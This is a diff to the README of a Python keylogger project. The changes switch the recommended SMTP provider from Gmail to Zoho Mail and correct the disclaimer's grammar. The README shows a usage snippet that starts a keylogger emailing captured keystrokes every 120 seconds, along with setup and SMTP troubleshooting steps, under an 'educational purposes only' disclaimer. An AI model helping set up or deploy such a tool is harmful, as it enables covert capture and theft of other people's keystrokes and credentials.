@@ -14,7 +14,7 @@ Before running the scripts, ensure the following:
 - Required Python libraries:
   - `pynput`
   - `smtplib` (included by default in Python)
-- Access to an email account with SMTP enabled (e.g., Gmail).
+- Access to an email account with SMTP enabled (e.g., Zoho Mail, as Gmail no longer supports SMTP for standard apps).
 
 ## Installation
 1. Clone this repository:
@@ -44,23 +44,23 @@ Before running the scripts, ensure the following:
 ```python
 # zkeylogger.py
 import keylogger
-my_keylogger = keylogger.Keylogger(120, "your-email@gmail.com", "your-app-password")
+my_keylogger = keylogger.Keylogger(120, "your-email@zoho.com", "your-app-password")
 my_keylogger.start()
 ```
 
 ## Important Notes
 - **Educational Purposes Only**: This tool is strictly for learning and research in a controlled environment. Unauthorized use is illegal and unethical.
 - Ensure you have proper permissions to use this on any device.
-- To use Gmail SMTP, you may need to enable "Allow less secure apps" or generate an app password.
+- Gmail no longer supports SMTP for standard apps as of January 2025. Use alternatives like Zoho Mail for SMTP-based configurations.
 
 ## Troubleshooting
 - If you encounter an `SMTPAuthenticationError`, ensure:
   - Email and password are correct.
   - SMTP is enabled for the email account.
-  - App-specific passwords are used if required (e.g., for Gmail).
+  - App-specific passwords are used if required (e.g., for Zoho Mail).
 
 ## Disclaimer
-The creator of this project are not responsible for any misuse. Always adhere to ethical practices and obtain proper consent before using such tools.
+The creators of this project are not responsible for any misuse. Always adhere to ethical practices and obtain proper consent before using such tools.
 
 ---
 
